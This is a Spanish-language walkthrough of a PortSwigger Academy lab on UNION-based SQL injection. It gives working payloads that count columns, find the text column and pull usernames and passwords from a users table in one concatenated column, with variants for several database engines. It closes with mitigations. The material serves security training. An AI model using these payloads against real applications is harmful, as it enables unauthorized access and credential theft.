Lab10: SQL injection UNION attack, retrieving multiple values in a single column

Nivel Practitioner
Tipo de SQLi SQL Injection UNION-based (extracción de múltiples valores en una sola columna)

Objetivo

Extraer los nombres de usuario y contraseñas almacenados en la tabla users mediante un ataque SQL Injection basado en UNION, combinando múltiples valores en una sola columna para poder visualizar la información en la respuesta de la aplicación.

Vulnerabilidad

El filtro de categorías de productos concatena directamente el parámetro category dentro de una consulta SQL sin realizar validación ni sanitización. Esto permite cerrar la cadena original y utilizar el operador UNION SELECT para combinar la consulta legítima con otra consulta maliciosa que accede a la tabla users, donde se encuentran almacenadas las credenciales de los usuarios.

Particularidad del laboratorio: La aplicación solo muestra una columna de texto en la respuesta, por lo que es necesario concatenar los valores de username y password en una sola columna para poder visualizar ambas informaciones.

Para ello, se utiliza la función CONCAT() (o el operador || dependiendo del motor de base de datos) para unir ambos campos en una única cadena.

Procedimiento

  1. Acceder al laboratorio y seleccionar cualquier categoría de productos (por ejemplo, "Gifts").
  2. Interceptar la petición con Burp Suite y enviarla al Repeater. 
    GET /filter?category=Gifts HTTP/1.1
  3. Determinar el número de columnas probando con NULL: 
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--

    Se confirma que la consulta original devuelve 2 columnas.

  4. Identificar qué columna acepta texto probando con strings: 
    ' UNION SELECT 'abc', NULL--
    ' UNION SELECT NULL, 'abc'--

    Se observa que la primera columna es la que muestra el texto 'abc' en la respuesta.

  5. Construir un payload que combine username y password en una sola columna usando la función CONCAT(): 
    ' UNION SELECT CONCAT(username,':',password), NULL FROM users--

    Este payload concatenará el nombre de usuario, dos puntos y la contraseña en una única cadena que se mostrará en la primera columna.

  6. Enviar la petición y observar la respuesta HTTP. En ella aparecerán todas las credenciales de los usuarios en el formato "usuario:contraseña".
  7. Localizar las credenciales del usuario administrator en la lista de resultados.
  8. Iniciar sesión en la aplicación con las credenciales obtenidas para resolver el laboratorio.

Payloads utilizados

Payload de prueba (identificar columna de texto)

' UNION SELECT NULL, 'abc'--

Payload de extracción con CONCAT

' UNION SELECT CONCAT(username,':',password), NULL FROM users--

Explicación de los payloads

  • ': Cierra la cadena de la categoría original.
  • UNION SELECT: Combina los resultados de la consulta legítima con los de la consulta maliciosa.
  • CONCAT(username,':',password): Función que concatena el nombre de usuario, dos puntos y la contraseña en una sola cadena. Esto es necesario porque la aplicación solo muestra una columna de texto.
  • NULL: Completa la segunda columna (no utilizada) para mantener el número correcto de columnas.
  • FROM users: Especifica la tabla que contiene las credenciales.
  • --: Comenta el resto de la consulta original para evitar errores de sintaxis.

Alternativas según motor de base de datos

  • Oracle, PostgreSQL: Se puede usar el operador || : ' UNION SELECT username||':'||password, NULL FROM users--
  • MySQL: Se puede usar CONCAT() o CONCAT_WS(): ' UNION SELECT CONCAT_WS(':', username, password), NULL FROM users--
  • Microsoft SQL Server: Se puede usar + : ' UNION SELECT username + ':' + password, NULL FROM users--

Consulta final ejecutada

SELECT * FROM products WHERE category = '' UNION SELECT CONCAT(username,':',password), NULL FROM users--' AND released = 1

La consulta devuelve los productos de la categoría original más las credenciales concatenadas de la tabla users, que se renderizan en la página web en un formato como:

administrator:8fg5h2j1
carlos:password123
wiener:passw0rd

Verificación del ataque

Al enviar el payload ' UNION SELECT CONCAT(username,':',password), NULL FROM users--, la respuesta HTTP muestra las credenciales de los usuarios en el formato "usuario:contraseña". Esto confirma que:

  • La inyección SQL fue exitosa.
  • Se ha accedido a la tabla users y se han extraído sus datos.
  • Aunque solo una columna sea visible, se ha podido recuperar información múltiple mediante concatenación.

Con las credenciales del administrador obtenidas (por ejemplo, "administrator:8fg5h2j1"), se accede al panel de administración, demostrando el impacto crítico de esta vulnerabilidad incluso cuando la interfaz limita la visualización de datos.

Resultado esperado: El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte de la estructura SQL, bloqueando cualquier intento de UNION SELECT.

SELECT * FROM products WHERE category = ? AND released = 1

Validación Estricta de Entradas

El parámetro de categoría debe aceptar únicamente valores válidos predefinidos (lista blanca). Por ejemplo, solo permitir las categorías existentes: 'Gifts', 'Lifestyle', 'Accessories', etc.

Principio de Menor Privilegio

La cuenta de base de datos utilizada por la aplicación no debe tener permisos para leer tablas sensibles como users. Idealmente, la cuenta de la aplicación solo debería tener acceso a las tablas necesarias para su funcionamiento (por ejemplo, la tabla products).

Gestión de Errores Controlada

Configurar la aplicación para que no muestre mensajes de error detallados al usuario, evitando dar pistas sobre la estructura de la base de datos.

Evitar Mostrar Datos Directamente

Implementar capas de abstracción que impidan que los resultados de consultas SQL se rendericen directamente en la interfaz sin procesar.
